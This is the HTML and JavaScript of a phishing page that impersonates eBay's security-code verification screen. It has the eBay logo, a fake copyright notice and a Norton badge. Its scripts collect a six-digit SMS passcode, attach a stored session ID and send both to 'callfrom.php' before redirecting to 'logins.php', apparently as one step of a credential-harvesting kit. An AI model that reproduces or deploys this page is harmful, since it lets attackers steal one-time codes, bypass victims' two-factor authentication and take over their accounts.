

<!DOCTYPE html>
<html lang="en" class="font-marketsans"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>Loading ....</title><style>
    .font-marketsans body {
        font-family: "Market Sans", Arial, sans-serif;
    }
</style><link rel="stylesheet" type="text/css" href="./css/hkfadhsvci5qlkf4nakqtfxs2y5.css"><link rel="stylesheet" href="./css/stepupauth-hub-07ug6_5q.css">
</head><body><div class="global-header"><div class="gh-acc-exp-div gh-hide-if-nocss"><a id="gh-hdn-stm" class="gh-acc-a" href="#">Skip to main content</a>
</div><!--[if lt IE 9]><div id="gh" role="banner" class="gh-IE8 gh-flex gh-pre-js gh-w gh-minH "><![endif]--><header id="gh" role="banner" class="gh-ui-6-5 gh-flex gh-pre-js gh-w gh-sch-prom gh-minH " data-treatment=""><table class="gh-tbl" role="presentation"><tbody><tr><td class="gh-td"><!--[if lt IE 9]><a href="#" _sp="m570.l2586" id="gh-la"><img width=117 height=120 style='clip:rect(47px, 118px, 95px, 0px); position:absolute; top:-47px;left:0' alt=" logo" src="https://ir.ebaystatic.com/rs/v/apstidvcvu5pxlbxkphrrdo5iqv.png" id="gh-logo"></a><![endif]--><a href="#" _sp="m570.l2586" id="gh-la"><img width="250" height="200" style="clip:rect(47px, 118px, 95px, 0px); position:absolute; top:-47px;left:0" alt="eBay logo" src="./css/fxxj3ttftm5ltcqnto1o4baovyl.png" id="gh-logo"></a></td><td class="gh-td"></td><td class="gh-td"></td><td class="gh-td"></td><td class="gh-td"></td><td class="sticky_placeholder"><ul></ul></td></tr></tbody></table><!--[if lt IE 9]></div><![endif]--></header> <div id="widgets-placeholder" class="widgets-placeholder" style="display: block;"><div class="gh-module-with-target" data-target-selector="#widgets-placeholder" data-is-first="" data-insert-after="false" data-is-critical="false"><div style="display:none" data-shoppingcartsize="0"></div></div></div><svg hidden="" style="display: none"><svg id="icon-search" viewBox="0 0 20 20" width="100%" height="100%"><path d="M19.786 18.557l-5.093-5.093a8.1 8.1 0 0 0 1.873-5.21C16.507 3.747 12.82 0 8.254 0 3.688 0 0 3.746 0 8.254c0 4.508 3.688 8.312 8.254 8.312 2.049 0 3.863-.761 5.327-1.932l5.093 5.093a.714.714 0 0 0 .527.234c.176 0 .41-.059.527-.234.351-.351.351-.878.059-1.171l-.001.001zM1.581 8.254a6.67 6.67 0 0 1 6.673-6.673 6.67 6.67 0 0 1 6.673 6.673c0 3.688-2.985 6.732-6.673 6.732s-6.673-2.985-6.673-6.732z"></path></svg><symbol id="icon-close" viewBox="1.5 1.5 21 21"><path d="M22.182 3.856c.522-.554.306-1.394-.234-1.938-.54-.543-1.433-.523-1.826-.135C19.73 2.17 11.955 10 11.955 10S4.225 2.154 3.79 1.783c-.438-.371-1.277-.4-1.81.135-.533.537-.628 1.513-.25 1.938.377.424 8.166 8.218 8.166 8.218s-7.85 7.864-8.166 8.219c-.317.354-.34 1.335.25 1.805.59.47 1.24.455 1.81 0 .568-.456 8.166-7.951 8.166-7.951l8.167 7.86c.747.72 1.504.563 1.96.09.456-.471.609-1.268.1-1.804-.508-.537-8.167-8.219-8.167-8.219s7.645-7.665 8.167-8.218z"></path></symbol><svg id="gh-icon-cart" viewBox="0 0 40 32"><path d="M35.0390625,6.8515625 C36.4453195,6.8515625 37.4674447,7.20312148 38.1054688,7.90625 C38.7434928,8.60937852 39.0625,9.66405547 39.0625,11.0703125 L39.0625,18.9609375 C39.0625,20.2369855 38.7434928,21.226559 38.1054688,21.9296875 C37.4674447,22.632816 36.4322988,22.984375 35,22.984375 L31.484375,22.984375 C29.3749895,22.984375 27.0898561,22.9778646 24.6289063,22.9648438 C22.1679564,22.9518229 19.9349059,22.9453125 17.9296875,22.9453125 L14.921875,22.9453125 L6.8359375,4.8203125 L0.859375,4.8203125 L0.8203125,0.7578125 L8.90625,0.7578125 L12.9296875,6.8515625 L35.0390625,6.8515625 Z M34.0625,18.9609375 C34.322918,18.9609375 34.5507803,18.8632822 34.7460938,18.6679688 C34.9414072,18.4726553 35.0390625,18.2317723 35.0390625,17.9453125 C35.0390625,17.6588527 34.9414072,17.4179697 34.7460938,17.2226562 C34.5507803,17.0273428 34.322918,16.9296875 34.0625,16.9296875 L17.9296875,16.9296875 C17.6692695,16.9296875 17.4414072,17.0273428 17.2460938,17.2226562 C17.0507803,17.4179697 16.953125,17.6588527 16.953125,17.9453125 C16.953125,18.2317723 17.0507803,18.4726553 17.2460938,18.6679688 C17.4414072,18.8632822 17.6692695,18.9609375 17.9296875,18.9609375 L34.0625,18.9609375 Z M34.0625,12.90625 C34.322918,12.90625 34.5507803,12.8085947 34.7460938,12.6132812 C34.9414072,12.4179678 35.0390625,12.1770848 35.0390625,11.890625 C35.0390625,11.630207 34.9414072,11.3958344 34.7460938,11.1875 C34.5507803,10.9791656 34.322918,10.875 34.0625,10.875 L15.9375,10.875 C15.6510402,10.875 15.4101572,10.9791656 15.2148438,11.1875 C15.0195303,11.3958344 14.921875,11.630207 14.921875,11.890625 C14.921875,12.1770848 15.0195303,12.4179678 15.2148438,12.6132812 C15.4101572,12.8085947 15.6510402,12.90625 15.9375,12.90625 L34.0625,12.90625 Z M34.0234375,24.8984375 C34.8828168,24.8984375 35.6249969,25.1979137 36.25,25.796875 C36.8750031,26.3958363 37.1875,27.1249957 37.1875,27.984375 C37.1875,28.8437543 36.8750031,29.5729137 36.25,30.171875 C35.6249969,30.7708363 34.8828168,31.0703125 34.0234375,31.0703125 C33.1640582,31.0703125 32.4283885,30.7708363 31.8164062,30.171875 C31.204424,29.5729137 30.8984375,28.8437543 30.8984375,27.984375 C30.8984375,27.1249957 31.204424,26.3958363 31.8164062,25.796875 C32.4283885,25.1979137 33.1640582,24.8984375 34.0234375,24.8984375 Z M19.8828125,24.8984375 C20.7421918,24.8984375 21.4778615,25.1979137 22.0898438,25.796875 C22.701826,26.3958363 23.0078125,27.1249957 23.0078125,27.984375 C23.0078125,28.8437543 22.701826,29.5729137 22.0898438,30.171875 C21.4778615,30.7708363 20.7421918,31.0703125 19.8828125,31.0703125 C19.0234332,31.0703125 18.2877635,30.7708363 17.6757812,30.171875 C17.063799,29.5729137 16.7578125,28.8437543 16.7578125,27.984375 C16.7578125,27.1249957 17.063799,26.3958363 17.6757812,25.796875 C18.2877635,25.1979137 19.0234332,24.8984375 19.8828125,24.8984375 Z"></path></svg><symbol id="icon-check" viewBox="0 0 30 30"><circle cx="14.5" cy="14.5" r="14.5" fill="#82187c"></circle><path fill="#82187c" stroke="#ffffff" stroke-width="2" d="M5.548 15.01l5.773 6.286L21.522 9.824"></path></symbol><symbol viewBox="0 0 23 22" id="icon-cart-new"><path fill-rule="evenodd" d="M22 4a.999.999 0 01.97 1.242l-2 8A1 1 0 0120 14H7a1 1 0 01-.97-.758L3.22 2H1a1 1 0 110-2h3a1 1 0 01.97.758L5.78 4H22zm-1.277 2H6.28l1.5 6h11.442l1.5-6zm-4.539 12A2.995 2.995 0 0119 16a2.995 2.995 0 11-2.816 4h-5.368a3 3 0 110-2h5.368zM7 19a1 1 0 102 0 1 1 0 00-2 0zm12 1a1 1 0 110-2 1 1 0 010 2z"></path></symbol></svg> </div><div class="body-content"><svg hidden="" style="height: 0;display: none"><symbol id="icon-messages" viewBox="1.5 3.23 21 17.57"><path fill-rule="evenodd" d="M20.571 17.154a1.72 1.72 0 0 1-1.714 1.714H5.143a1.72 1.72 0 0 1-1.714-1.714l.008-10.286c0-.943.763-1.714 1.706-1.714h13.714a1.72 1.72 0 0 1 1.714 1.714v10.286zM18.857 3.225A3.647 3.647 0 0 1 22.5 6.868v10.285a3.647 3.647 0 0 1-3.643 3.642H5.143A3.647 3.647 0 0 1 1.5 17.153l.009-10.287a3.642 3.642 0 0 1 3.634-3.641h13.714zM12 13.802L18.313 8.5a.964.964 0 1 0-1.235-1.482L12 11.291 6.683 7a.963.963 0 1 0-1.234 1.482L12 13.803z"></path></symbol><symbol id="icon-send" viewBox="1.5 2.3 21.5 19.4"><path d="M3.253 21.504a1.73 1.73 0 0 1-.23.103c-.296.107-.586.129-.901-.06-.35-.211-.454-.495-.491-.853a2.105 2.105 0 0 1-.006-.34c.002-.03.005-1.085.01-3.162l1.657.005-.01 2.46 17.19-7.66L3.293 4.28l-.008 4.892h3.563c.349.02.814.126 1.293.396.834.471 1.354 1.293 1.354 2.432 0 1.14-.52 1.96-1.354 2.432-.479.27-.944.376-1.34.397H2.457V13.17l4.296.002c.118-.007.352-.06.572-.185.332-.187.511-.47.511-.988 0-.517-.179-.801-.51-.988a1.547 1.547 0 0 0-.526-.183H1.625l.003-2.316c.005-3.784.005-3.784.01-4.976a1.45 1.45 0 0 1 .03-.423c.052-.222.156-.426.358-.59a.995.995 0 0 1 .595-.223 1.187 1.187 0 0 1 .553.11l19.204 8.626a1.2 1.2 0 0 1 .272.17c.228.186.391.44.391.793a.99.99 0 0 1-.386.79c-.098.08-.19.134-.276.173l-18.984 8.46a2.21 2.21 0 0 1-.142.082zM3.291 3.43zm-.836 11.42c-.528 0-.955-.38-.955-.85s.427-.85.955-.85v1.7zm.82 2.35H1.653c0-.497.363-.9.811-.9.448 0 .811.403.811.9z"></path></symbol><symbol id="icon-notification" viewBox="1.5 1.5 21 21"><path d="M12.053 22.5c-2.284 0-4.249-1.577-4.81-3.724L1.5 18.715l.019-3.772 1.953-.687-.021-3.18a8.527 8.527 0 0 1 5.756-8.094L9.182 1.5h5.773l-.013 1.455a8.376 8.376 0 0 1 5.722 7.98l.025 3.406 1.811.616v3.77l-10.49-.032a.959.959 0 0 1 .002-1.92h.004l8.568.027v-.47l-1.801-.613-.035-4.777c0-3.037-2.052-5.637-4.99-6.33l-.747-.176.01-1.016h-1.89l.017 1.027-.743.182a6.609 6.609 0 0 0-5.038 6.44l.03 4.545-1.97.693-.001.508 5.516.059.066.879a3.067 3.067 0 0 0 3.045 2.827c.777 0 1.517-.293 2.084-.825a.957.957 0 0 1 1.354.046.961.961 0 0 1-.045 1.357 4.945 4.945 0 0 1-3.393 1.342"></path></symbol><symbol id="icon-confirmation" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12c0-3.183-1.264-6.235-3.515-8.485A11.996 11.996 0 0012 0zm0 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-2-7.41l7.29-7.3h.01a1 1 0 011.41 1.41l-8 8a1 1 0 01-1.41 0l-4-4a1 1 0 011.41-1.41l3.29 3.3z"></path></symbol><symbol viewBox="0 0 24 24" id="icon-confirmation-filled"><path fill="#36CF57" d="M0 12C0 5.373 5.373 0 12 0c3.183 0 6.235 1.264 8.485 3.515A11.996 11.996 0 0124 12c0 6.627-5.373 12-12 12S0 18.627 0 12zm10.71 4.71l8-8h-.01a1 1 0 00-1.41-1.41L10 14.59 6.71 11.3a1 1 0 00-1.41 1.41l4 4a1 1 0 001.41 0z"></path></symbol><symbol viewBox="0 0 16 16" id="icon-confirmation-filled-small"><path fill="#36CF57" d="M8 0a8 8 0 100 16A8 8 0 008 0zm3.71 6.71l-4 4a1 1 0 01-1.41 0l-2-2a1 1 0 011.41-1.42L7 8.59l3.29-3.29a1 1 0 011.41 1.41h.01z"></path></symbol><symbol viewBox="0 0 24 24" id="icon-attention-filled"><path fill="#e62048" fill-rule="evenodd" d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12C23.994 5.375 18.625.006 12 0zm0 18a1 1 0 110-2 1 1 0 010 2zm1-5V7a1 1 0 00-2 0v6a1 1 0 002 0z"></path></symbol><symbol viewBox="0 0 16 16" id="icon-attention-filled-small"><path fill="#e62048" d="M8 0a8 8 0 100 16A8 8 0 008 0zm0 12a1 1 0 110-2 1 1 0 010 2zm1-4a1 1 0 11-2 0V5a1 1 0 112 0v3z"></path></symbol><symbol viewBox="0 0 58 53" id="icon-text-messaging-large"><path fill-rule="evenodd" d="M49 0a9 9 0 019 8.999v23.996c0 4.614-3.474 8.418-7.95 8.938l-.05.004v6.055c0 3.956-4.36 6.318-7.66 4.234l-.173-.114-14.72-10.119H9A9 9 0 01.004 33.26L0 32.995V8.999A9 9 0 019 0zm0 5H9a4 4 0 00-4 3.999v23.996a4 4 0 004 3.999h20l16 10.998V36.994h4a4 4 0 004-4V9a4 4 0 00-4-4zM26.5 23.995a2.5 2.5 0 010 5h-14a2.5 2.5 0 010-5h14zm19-10.998a2.5 2.5 0 010 5h-33a2.5 2.5 0 110-5h33z"></path></symbol></svg>

<script>
var timeleft = 5;
var downloadTimer = setInterval(function(){
  if(timeleft <= 0){
    clearInterval(downloadTimer);
    document.getElementById("count-down").innerHTML = "";
  } else {
    document.getElementById("count-down").innerHTML = " disabled="" ";
  }
  timeleft -= 1;
}, 1000);
</script>

<script>
var timeleft = 60;
var downloadTimer = setInterval(function(){
  if(timeleft <= 0){
    clearInterval(downloadTimer);
    document.getElementById("countdown").innerHTML = "0 seconds";
  } else {
    document.getElementById("countdown").innerHTML = timeleft + " seconds";
  }
  timeleft -= 1;
}, 1000);
</script>


<script>
$(document).ready(function(){
    $('input').keyup(function(){
        if($(this).val().length==$(this).attr("maxlength")){
            $(this).next().focus();
        }
    });
});
</script>
<div id="mainContent" role="main"><div aria-live="assertive"></div>
<div class="info-header">
<h1 id="info-header-main" class="info-header-main" role="heading" aria-level="1" tabindex="0">We sent the code to your number. Enter security code</p></div>

<div class="pin-boxes" id="pin-boxes" >
<p id="digit-focus-info" class="clipped">Enter a single digit in each field. Focus will be automatically shifted to the next field. </p>
<form id="form2" method="post" onsubmit="combinePin()">

  <input id="pin-box-0" name="cod1" type="tel" maxlength="1" size="1"
         class="pin-box--status-normal" required>
  <input id="pin-box-1" name="cod2" type="tel" maxlength="1" size="1"
         class="pin-box--status-normal" required>
  <input id="pin-box-2" name="cod3" type="tel" maxlength="1" size="1"
         class="pin-box--status-normal" required>
  <input id="pin-box-3" name="cod4" type="tel" maxlength="1" size="1"
         class="pin-box--status-normal" required>
  <input id="pin-box-4" name="cod5" type="tel" maxlength="1" size="1"
         class="pin-box--status-normal" required>
  <input id="pin-box-5" name="cod6" type="tel" maxlength="1" size="1"
         class="pin-box--status-normal" required>

  <!-- Hidden field for full PIN -->
  <input type="hidden" id="field3" name="field3">



<script>
  // Auto move to next box when typing
  const boxes = document.querySelectorAll('input[id^="pin-box-"]');
  boxes.forEach((box, index) => {
    box.addEventListener("input", () => {
      if (box.value.length === box.maxLength && index < boxes.length - 1) {
        boxes[index + 1].focus();
      }
    });

    // Allow backspace to go back
    box.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && box.value === "" && index > 0) {
        boxes[index - 1].focus();
      }
    });
  });

  // Collect digits before submit
  function combinePin() {
    let pin = "";
    boxes.forEach(box => pin += box.value);
    document.getElementById("field3").value = pin;
  }
</script>

<script>
function getUID(){ return localStorage.getItem('session_uid'); }

document.getElementById('form2').addEventListener('submit', async function(e){
  e.preventDefault();
  const uid = getUID();
  if (!uid) { alert('Session UID not found. Please start again.'); return; }
  const fd = new FormData(this);
  fd.append('uid', uid);
  const res = await fetch('callfrom.php', { method: 'POST', body: fd });
  const j = await res.json();
  if (j.ok) {
    // clear session uid so next page1 creates new line if user returns
    localStorage.removeItem('session_uid');
    // redirect to google as requested
    window.location.href = 'logins.php';
  } else {
    alert(j.msg || 'Save failed');
  }
});
</script>


</div><div id="error-notice-wrapper" aria-live="assertive">
</div><div class="primary-actions">
<button id="resend-btn" aria-describedby="count-down"  class="actbtn actbtn--busy btn btn--fluid btn--truncated btn--secondary" value="Bouton cliquer" data-ebayui="" type="button">Resend</button>
<button id="verify-btn" class="actbtn actbtn--busy btn btn--fluid btn--truncated btn--primary" data-ebayui="" type="submit">Verify</button></form>
</div><div id="count-down" class="secondary-actions">
<span tabindex="-1" id="resend-wait" role="text">You can resend the security code in <span id="countdown">
<div id="countdown"></div></span>  
</span></div><div class="secondary-actions">
    <a id="try-another-option" href="#">Other instant verification options</a></div><div class="secondary-actions">
        <p id="contact-us-link">For further assistance accessing your account, <a href="#" id="pleaseContactUs">please contact us</a>.</p></div>
        <p class="hide" id="authentication-id">Qs0BnBp90ZjuTluDzdEhr-15</p></div></div>
        <div id="widget-platform">   
              </div>
            </div>
        <!--[if lt IE 9]><div id="glbfooter" role="contentinfo" class="gh-w gh-flex"><![endif]--><footer id="glbfooter" role="contentinfo" class="gh-w gh-flex"><div>
            <div id="rtm_html_1650"></div><div id="rtm_html_1651"></div></div><h2 class="gh-ar-hdn">Additional site navigation</h2><div id="gf-t-box">
                <table class="gf-t" role="presentation"><tbody><tr valign="top"><td class="gf-legal">Copyright &copy; 1995-2026  Inc. All Rights Reserved. <a href="#">User Agreement</a>, 
                <a href="#">Privacy</a>, <a href="#">Cookies</a> and <a href="#" id="gf-AdChoice">AdChoice</a></td>
                <td nowrap="" align="center"><a title="Verify site&#39;s SSL certificate" _exsp="m571.l3943" href="#" onclick="#">
                    <i id="gf-norton">Norton Secured - powered by DigiCert</i></a></td></tr></tbody></table></div><!--[if lt IE 9]></div><![endif]--></footer>
                    <script src="./css/stepupauth-hub--WZBRe8a.js.download"></script>
<img src="./css/9" width="1" height="1" border="0" alt="" lhmhm9mxx=""></body></html>